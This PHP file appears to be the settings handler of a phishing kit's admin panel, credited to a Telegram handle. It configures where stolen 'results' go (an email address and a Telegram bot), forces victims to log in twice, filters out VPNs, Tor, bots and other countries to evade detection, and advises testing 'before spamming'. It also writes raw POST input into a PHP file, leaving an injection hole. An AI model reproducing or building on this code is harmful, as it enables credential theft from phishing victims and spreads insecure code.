<?php
/*   
TELEGRAM @H4x0rxploit
JOIN US AT TELEGRAM GROUP : https://t.me/H4x0rxploits
*/
    session_start();

    if (
        !isset($_SESSION['login']) ||
        !$_SESSION['login']
    ) {
        die(header("Location: ../login.php"));
    }

    if ($_POST['doubleLogin'] == "on") {
        $doubleLogin = "on";
    } else {
        $doubleLogin = "off";
    }
    if ($_POST['EmaildoubleLogin'] == "on") {
        $EmaildoubleLogin = "on";
    } else {
        $EmaildoubleLogin = "off";
    }


    if ($_POST['vpn'] == "on") {
        $vpn = "on";
    } else {
        $vpn = "off";
    }

    if ($_POST['heuristicvpn'] == "on") {
        $hvpn = "on";
    } else {
        $hvpn = "off";
    }

    if ($_POST['cfp'] == "on") {
        $cfp = "on";
    } else {
        $cfp = "off";
    }
    if ($_POST['telegrams'] == "on") {
        $telegram = "on";
    } else {
        $telegram = "off";
    }

    $settings = fopen("presh.php", "w+");
    fwrite($settings, '

        <?php
        
        ?>

; Always test your page before spamming
; & most importantly, have a good day !
;   - ðŸº MR.Haxor telegram @H4x0rxploitŽ -

; Admin Panel Login
; Options: credentials

Username = "' . $_POST['username'] . '"
Password = "' . $_POST['password'] . '"

; Your email for results
; Options: email address

Email = "' . $_POST['email'] . '"

; Double login
; Options: on or off

LoginTwice = "' . $doubleLogin . '"

; Double login
; Options: on or off

EmailLoginTwice = "' . $EmaildoubleLogin . '"

; Whitelist your IP
; Use a VPN / Proxy !
; Options: IP or off

MyIP = "' . $_POST['ip'] . '"

; Proxy, Hosting, Tor detection
; Options: on or off

VPN = "' . $vpn . '"

; Proxy, Hosting, Tor detection
; Not 100% reliable though
; Options: on or off

HeuristicVPN = "' . $hvpn . '"

; Special "cloudflare" protection
; will block 99% of bots in theory
; Options: on or off

CFProtection = "' . $cfp . '"

; Allow access to a specific country
; Options: country code or off

CountryLock = "' . $_POST['country_name'] . '"


;For telegram results added by MR.Haxor
;Telegram added
telegram = "' . $telegram . '"
chat_id = "' . $_POST['chatid'] . '"
bot_url = "' . $_POST['token'] . '"

');






    $_SESSION['success'] = "Successfully updated page settings.";
    header("Location: ../settings.php");